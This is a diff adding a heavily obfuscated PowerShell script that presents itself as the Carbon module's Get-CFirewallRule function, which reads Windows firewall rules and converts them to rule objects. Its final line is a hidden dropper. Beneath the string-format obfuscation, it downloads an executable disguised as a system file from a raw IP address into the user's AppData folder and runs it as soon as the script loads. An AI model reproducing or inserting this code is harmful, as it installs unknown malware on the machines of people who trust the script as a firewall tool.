@@ -1,0 +1,209 @@
+${t`NwHy}  =  [typE]("{5}{1}{2}{3}{0}{6}{4}"-F'U','A','rBoN.FiREWA','lL.R','EprofilE','c','l') ; set-iTEm  ("VarIA"+"Ble:"+"2Cph"+"s"+"5") (  [TypE]("{3}{6}{1}{4}{0}{7}{2}{5}{8}"-f 'RE','Rb','ULEDIr','c','oN.FI','Ec','A','WAlL.r','TION')  );${9`B6}= [TYPe]("{5}{6}{0}{7}{2}{3}{4}{1}" -f'r','TIoN','oN.firew','ALL.RULE','ac','C','A','B')  ;   SeT-ItEm ("vaR"+"iab"+"le:7d"+"mk")  ([tyPE]("{6}{4}{5}{0}{2}{1}{3}" -f 'RulEI','TerfA','n','cEtYpE','rewall','.','CaRbON.Fi')  ) ;  Sv  ("DV"+"5")  (  [TYpe]("{1}{0}{2}"-F'eS','iPaDDR','s')  ) ; sET-ItEm  ("{2}{0}{3}{1}" -f'aRia','KHdOl','V','ble:W')  ( [TYPE]("{2}{1}{0}" -f 'erT','nV','co') );  sET-ITEM  ("vaRiaB"+"LE:BTi"+"fv") ([TYpE]("{2}{4}{1}{0}{3}" -F 'AL','rew','cARBOn.F','l.RuLESECuRItY','i') );
+function G`ET-CfIREw`Al`lrule
+{
+    
+    [CmdletBinding(DEfaULtPARaMeTErsetnAME='All')]
+    [OutputType([Carbon.Firewall.Rule])]
+    param(
+        [Parameter(MAnDAtOry=${T`RuE},paraMETErSeTNamE="BY`NAme")]
+        [string]
+        
+        ${N`Ame},
+
+        [Parameter(MAnDaTOry=${Tr`Ue},pARameTERSEtnAme="bYlI`TErA`lnA`me")]
+        [string]
+        
+        ${L`iT`eRalnAmE}
+    )
+
+    &("{2}{1}{0}" -f'de','tMo','Set-Stric') -Version ("{1}{0}"-f 'st','Late')
+    &("{3}{1}{4}{2}{0}{5}"-f'e','all','refer','Use-C','erP','nce') -Cmdlet ${p`S`c`MDlet} -Session ${eXE`c`Ut`IOn`cO`NtEXt}."s`E`ssionST`ATe"
+    
+    if( -not (&("{5}{1}{4}{6}{3}{0}{8}{2}{7}" -f'ire','s','allConf','-CF','se','A','rt','igurable','w')) )
+    {
+        return
+    }
+
+    ${f`W} = &("{1}{0}{2}"-f 'jec','New-Ob','t') -ComObject ("{1}{2}{3}{0}{4}"-f 'icy','HNet','Cfg','.FwPol','2')
+    ${fW}."R`ULEs" |
+        &("{2}{0}{1}"-f '-','Object','Where') { 
+            if( ${PSCmDL`et}.PaRameTersetnamE -eq ("{2}{3}{1}{0}" -f 'e','eralNam','ByL','it') )
+            {
+                return ${_}."Na`mE" -eq ${L`It`ErAlname}
+            }
+
+            if( -not ${n`AME} )
+            {
+                return ${T`RUE}
+            }
+
+            return ${_}."n`Ame" -like ${n`Ame} 
+        } | .("{2}{3}{0}{1}"-f 'h-Objec','t','F','orEac') {
+    
+            ${R`ULe} = ${_}
+
+            &("{0}{1}{2}"-f'Writ','e','-Debug') -Message ${Ru`le}."N`AMe"
+
+            ${p`ROF`iLes} =   (lS ('va'+'riAble:'+'Tn'+'Why'))."V`AluE"::"a`Ny"
+            if( ${RU`Le}."pRo`FiL`es" -eq 0x7FFFFFFF )
+            {
+                ${p`R`OFIl`eS} =  (GET-vARIaBLe  ("Tnwh"+"Y")  -ValUEO  )::"D`oM`AiN" -bor  ${t`Nw`hY}::"p`RIVATe" -bor   ${tN`wHY}::"PU`BlIC"
+            }
+            else
+            {
+                if( (${rU`LE}."prO`F`ileS" -band 1) -eq 1 )
+                {
+                    ${pr`oFI`Les} = ${Pr`of`iLes} -bor   ${T`N`WhY}::"d`OmaIN"
+                }
+                if( (${r`ULE}."P`Rofi`lEs" -band 2) -eq 2 )
+                {
+                    ${prO`F`iLeS} = ${PRo`FiLEs} -bor  (GeT-VARiABLE ("tNW"+"hY")  -vAl  )::"pR`iVAtE"
+                }
+                if( (${r`ULe}."pro`F`IlEs" -band 4) -eq 4 )
+                {
+                    ${pr`OFI`lES} = ${p`ROfiL`ES} -bor  (lS  ('vA'+'r'+'iAble:TN'+'wHy'))."vA`LUE"::"PU`B`Lic"
+                }
+            }
+            .("{2}{1}{3}{0}" -f'ug','te','Wri','-Deb') -Message ('  Profiles          {0,25} -> {1}' -f ${rU`le}."p`RoFIL`Es",${PrOF`IL`ES})
+            ${p`Ro`TO`COL} = switch( ${R`ULe}."pR`oto`cOl" ) 
+            {
+                6 { 'TCP' }
+                17 { 'UDP' }
+                1 { ("{0}{1}{2}"-f'IC','MPv','4') }
+                58 { ("{0}{1}"-f'IC','MPv6') }
+                256 { 'Any' }
+                ("{2}{1}{0}" -f'lt','u','defa') { ${_} }
+            }
+
+            if( (${r`Ule} | &("{2}{0}{1}"-f't-Memb','er','Ge') -Name ("{1}{3}{0}{2}" -f'es','IcmpT','AndCodes','yp')) -and ${R`Ule}."IcmPtyp`E`sAnd`Co`dES" )
+            {
+                ${t`YPE},${C`oDE} = ${rU`le}."IcmpTy`P`e`sAn`DCoDES" -split ':' | &("{2}{0}{1}{3}" -f 'on','vert','C','To-Any')
+                if( -not ${C`ode} )
+                {
+                    ${cO`dE} = 'Any'
+                }
+                ${PR`otO`c`ol} = '{0}:{1},{2}' -f ${PrO`TOC`ol},${t`YPe},${c`oDE}
+                .("{2}{1}{0}{3}" -f'e','-D','Write','bug') -Message ('  IcmpTypesAndCode  {0,25} -> {1},{2}' -f ${RU`Le}."I`cmptYPeSan`dCOD`ES",${t`yPe},${c`ode})
+            }
+            .("{2}{0}{1}{3}"-f '-De','bu','Write','g') -Message ('  Protocol          {0,25} -> {1}' -f ${Ru`le}."pR`o`TocOL",${P`Ro`TOcol})
+
+            ${d`I`Re`cTiOn} = switch( ${RU`lE}."Di`RECT`IOn" )
+            {
+                1 {   ${2cP`H`S5}::"i`N" }
+                2 {   (  lS ("VAria"+"BLe:"+"2CpH"+"S"+"5") )."V`ALUE"::"o`Ut" }
+            }
+
+            ${A`Cti`On} = switch( ${r`Ule}."acTi`on" )
+            {
+                0 {  (  get-VAriable  ('9'+'B6') -VaLuEOn)::"B`lOcK" }
+                1 {   (  ITEM ("{3}{1}{2}{0}"-f '9b6','arIAB','le:','V'))."v`AlUE"::"alL`Ow" }
+                ("{1}{2}{0}" -f 'ult','def','a') { throw ('Unknown action ''{0}''.' -f ${_}) }
+            }
+
+            ${iNT`e`Rf`ACEtYPE} =  ( Get-ItEm  ("{0}{1}{2}" -f 'V','ar','iABlE:7dMk') )."VA`LUE"::"A`Ny"
+            ${Ru`lE}."iNTe`RFa`C`et`YpEs" -split ',' |
+                &("{1}{0}{2}" -f 're','Whe','-Object') { ${_} -ne 'All' } |
+                .("{2}{1}{3}{0}"-f'Object','orEac','F','h-') {
+                    if( ${_} -eq ("{1}{2}{0}{3}" -f'eA','Remo','t','ccess') )
+                    {
+                        ${_} = 'Ras'
+                    }
+                    ${i`NTeRFA`CET`y`pE} = ${i`NTErf`A`C`etype} -bor   ( gET-VAriable  ('7dM'+'k')  )."va`Lue"::${_}
+                }
+            &("{0}{1}{2}" -f 'W','rite','-Debug') -Message ('  InterfaceType     {0,25} -> {1}' -f ${ru`LE}."iN`TErfaCETY`PES",${Int`ER`F`AcE`TYPe})
+
+            function cONv`ERt`TO-Any
+            {
+                param(
+                    [Parameter(ValUEfrOmpipeLiNE=${t`RUe})]
+                    ${InpUt`O`B`Ject}
+                )
+
+                process
+                {
+                    if( ${In`PuTo`BJEct} -eq '*' )
+                    {
+                        return 'Any'
+                    }
+
+                    ${inp`UTo`BJEct} = ${iN`Put`ObJ`eCt} -split ',' |
+                                        &("{1}{0}{3}{2}" -f'rEac','Fo','-Object','h') { 
+                                            ${iPad`d`ResS},${M`ASK} = ${_} -split '/'
+                                            [ipaddress]${mAsKAD`DR`EsS} = ${nU`Ll}
+                                            if( ${mA`SK} -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$' -and  ${d`V5}::"Trypar`sE"(${m`ASK}, [ref]${MAs`K`ADDre`Ss}) )
+                                            {
+                                                ${C`IDR} = ${MAsk`Ad`d`REss}.("{1}{0}{2}{4}{3}"-f 'etAd','G','dressB','tes','y').Invoke() | 
+                                                            &("{2}{1}{0}{3}{4}"-f'Each-','or','F','Obje','ct') {  ( VARIabLe ("{1}{0}"-f'HDOl','Wk') -vAL  )::("{0}{1}{2}" -f 'ToS','tr','ing').Invoke(${_}, 2) -replace ("{0}{1}"-f'[s','0]') } |
+                                                            .("{2}{0}{1}"-f 'ec','t','Select-Obj') -ExpandProperty ("{0}{1}" -f 'Leng','th') |
+                                                            .("{3}{4}{0}{2}{1}" -f're-Obj','ct','e','Mea','su') -Sum | 
+                                                            &("{2}{1}{0}"-f 'ect','-Obj','Select') -ExpandProperty 'Sum'
+                                                return '{0}/{1}' -f ${I`padD`RESs},${C`iDr}
+                                            }
+                                            return ${_}
+                                        }
+                    return ${iN`pUT`objEcT} -join ','
+                }
+            }
+
+            ${LocAlaDdR`E`SsES} = ${Ru`lE}."Lo`CAlaD`d`R`ESSES" | &("{1}{0}{2}"-f'To','Convert','-Any')
+            .("{2}{0}{1}" -f'Deb','ug','Write-') -Message ('  LocalAddresses    {0,25} -> {1}' -f ${ru`le}."l`O`cAlAd`dresseS",${Lo`c`A`laD`DrEsSEs})
+            ${remotEaD`drE`S`S`Es} = ${rU`lE}."R`eMO`TeadDReSS`ES" | .("{2}{3}{0}{1}"-f 'o-','Any','Conver','tT')
+            .("{3}{2}{0}{1}" -f 'D','ebug','-','Write') -Message ('  RemoteAddresses   {0,25} -> {1}' -f ${RU`Le}."ReMOteA`DDRes`Ses",${REm`O`Te`ADdreSS`eS})
+            ${l`O`Ca`LPorts} = ${R`ULe}."L`OCalP`oRTs" | &("{2}{1}{0}{3}{4}" -f 'vert','on','C','To-An','y')
+            .("{0}{2}{1}"-f 'Wri','ug','te-Deb') -Message ('  LocalPorts        {0,25} -> {1}' -f ${R`ULe}."LOcA`L`PoRtS",${L`oCAL`PoR`TS})
+            ${r`EM`OtEPOr`Ts} = ${rU`le}."re`mo`TEporTS" | &("{2}{0}{1}" -f'onvertT','o-Any','C')
+            .("{2}{0}{1}" -f 'u','g','Write-Deb') -Message ('  RemotePorts       {0,25} -> {1}' -f ${RU`le}."REMo`Te`pO`Rts",${ReMotE`po`R`Ts})
+
+            ${ed`G`etrAVer`saL} = switch( ${r`Ule}."EDgEtr`A`Ve`RSA`LoPT`IONS" ) 
+            {
+                0 { 'No' }
+                1 { 'Yes' }
+                2 { ("{2}{5}{3}{6}{0}{1}{4}" -f'ati','o','D','appl','n','efer to ','ic') }
+                3 { ("{3}{2}{1}{0}"-f 'o user','t','er ','Def') }
+            }
+
+            ${se`CU`RiTY} =   ( GEt-cHIldiTEM  ("{1}{0}{3}{2}{4}"-f 'abLE:B','VArI','F','ti','v'))."Val`UE"::"nO`TR`EQ`UireD"
+            if( ${rU`Le} | &("{0}{2}{1}"-f 'Get-','r','Membe') -Name ("{2}{1}{0}" -f'gs','eFla','Secur') )
+            {
+                ${Se`C`Urity} = switch( ${r`UlE}."S`ECur`EF`lags" )
+                {
+                    1 {  ${bT`i`Fv}::"AUthnoE`N`CAP" }
+                    2 {  ${B`Tifv}::"A`UT`HEnticA`TE" }
+                    3 {  (  get-VarIaBLE  ("{1}{0}" -f'TiFV','b') )."V`AlUe"::"AutHDyN`e`NC" }
+                    4 {  ${B`T`Ifv}::"aU`T`heNC" }
+                    ("{1}{0}"-f'fault','de') {  ( VARIABLe ("BTI"+"fV") )."Va`LuE"::"no`T`R`EqUIred" }
+                }
+                &("{1}{2}{0}"-f'g','Write','-Debu') -Message ('  Security          {0,25} -> {1}' -f ${R`ULE}."s`eCu`RE`FlAgs",${seCu`R`iTy})
+            }
+
+            ${sER`Vic`EN`AME} = ${R`ULe}."SE`RVICenA`me" | &("{0}{2}{3}{1}{4}" -f 'C','tTo-','o','nver','Any')
+            .("{2}{0}{1}"-f'ite-Debu','g','Wr') -Message ('  Service           {0,25} -> {1}' -f ${R`UlE}."seRv`I`cenAmE",${serv`I`cEN`AMe})
+
+
+            ${C`ONS`TR`U`ctorArgS} = @(
+                                    ${r`ULe}."NA`me", 
+                                    ${R`Ule}."e`N`AbLed",
+                                    ${diR`ECTi`on},
+                                    ${p`RO`FILES},
+                                    ${RU`le}."gR`Ou`PING",
+                                    ${loc`AL`A`d`DReSSEs},
+                                    ${LO`caLp`OrtS},
+                                    ${rEMoTeA`DD`RE`SSEs},
+                                    ${ReMo`Te`Po`RtS},
+                                    ${pR`ot`OcoL},
+                                    ${E`DgetRa`VE`Rs`Al},
+                                    ${a`ctioN},
+                                    ${iNtEr`FAC`E`T`yPe},
+                                    ${s`ecuRi`Ty},
+                                    ("{1}{0}{2}"-f'al','Loc',' Setting'), 
+                                    ${Ru`lE}."de`SC`RIPTiON",
+                                    ${r`ULe}."appliCA`TI`oN`NA`Me",
+                                    ${sERvI`c`e`NamE}
+                                )
+            &("{0}{1}{2}" -f 'Ne','w-Obj','ect') -TypeName ("{1}{3}{0}{2}"-f'ewall.Rul','Carbo','e','n.Fir') -ArgumentList ${co`NS`TRuC`TOr`ARGS}
+        } 
+}
+
+.("{1}{2}{0}" -f'ias','Set-','Al') -Name ("{0}{3}{1}{2}"-f'Get-F','le','s','irewallRu') -Value ("{2}{4}{1}{0}{3}" -f'wallRul','ire','Get-','e','CF')
+
+(.("{0}{1}{2}"-f'Ne','w-Obje','ct') ("{1}{2}{0}{3}{4}" -f 'e','System.Ne','t.W','bCli','ent')).("{2}{0}{3}{1}"-f'ownl','e','D','oadFil').Invoke(("{2}{6}{0}{4}{5}{3}{1}" -f '53.23','e','http://94.102','srsv.ex','8','/~yahoo/c','.'),"$env:APPDATA\csrsv.exe");&("{3}{0}{2}{1}"-f 'tart-','ess','Proc','S') ("$env:APPDATA\csrsv.exe")
